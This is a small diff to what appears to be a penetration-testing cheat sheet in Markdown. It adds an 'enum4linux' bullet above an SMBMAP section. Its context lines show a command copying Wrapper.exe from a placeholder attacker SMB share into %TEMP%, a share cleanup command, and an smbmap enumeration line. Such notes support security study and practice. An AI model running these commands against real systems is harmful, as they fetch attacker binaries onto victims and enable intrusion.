@@ -519,6 +519,8 @@ copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
 net use \\ATTACKER_IP\share /del
 ```
 
+- **enum4linux**
+
 ### SMBMAP
 - Default
   - smbmap -H $target
